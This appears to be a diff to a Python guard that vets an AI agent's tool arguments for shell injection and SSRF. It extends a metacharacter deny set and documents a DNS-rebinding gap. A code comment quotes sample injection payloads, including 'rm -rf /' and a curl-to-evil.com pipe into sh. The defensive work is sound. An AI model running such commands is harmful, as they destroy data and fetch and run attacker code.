@@ -111,9 +111,12 @@ _PATH_KEY_RE = re.compile(r"(path|file|dir|directory|folder)", re.IGNORECASE)
 # Shell metacharacters that, if present in an argument passed to an EXECUTE
 # tool, could be used to break out of the intended single command and chain
 # on additional shell commands (e.g. "; rm -rf /", "$(curl evil.com|sh)",
-# "`whoami`", "a && b", pipes, redirection, backslash-escapes, or embedded
-# newlines that start a new logical command).
-_SHELL_METACHARS = set(";|&`$()<>\\\n")
+# "`whoami`", "a && b", pipes, redirection, backslash-escapes, embedded
+# newlines/tabs that start a new logical command or argument, brace/tilde
+# expansion (`{a,b}`, `~user`), or an embedded NUL byte (which some shells/
+# libc argument parsers treat as a string terminator, letting trailing
+# bytes after it be smuggled past a naive substring check).
+_SHELL_METACHARS = set(";|&`$()<>\\\n\t{}~\x00")
 
 # Hostnames that are blocked outright regardless of how they resolve in DNS,
 # because they are reliably used to reach sensitive local/internal services:
@@ -539,6 +542,24 @@ def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
 
     Returns a single CRITICAL `SSRF` Finding (in a list) on any of these
     matches, or an empty list if the argument is clean.
+
+    **Known limitation (TOCTOU / DNS rebinding):** the DNS resolution in
+    step 5 happens *now*, at authorization time -- not at the moment the
+    wrapped tool actually opens the connection. An attacker controlling the
+    DNS record for an approved-looking hostname can serve a public IP for
+    this lookup and then "rebind" the record to an internal address before
+    the tool's own (separate) resolution happens microseconds-to-seconds
+    later, slipping past this check entirely. This guard cannot close that
+    gap by itself, because it has no hook into the tool's actual network
+    call -- a complete fix requires either (a) the tool implementation
+    resolving the host once and reusing that pinned IP for the connection
+    (e.g. via `requests`' `Session` with a custom `HTTPAdapter`, or
+    `urllib3`'s `HTTPConnectionPool(..., server_hostname=...)`), or (b) the
+    SSRF check being re-run with the IP frozen at request time rather than
+    re-resolved. Treat this check as a strong best-effort filter, not a
+    substitute for network-level egress controls (e.g. a NAT/firewall
+    blocking RFC 1918 and link-local destinations for the agent's runtime
+    regardless of what the application layer decided).
     """
 
     ip_literal = _looks_like_ip_literal(value)
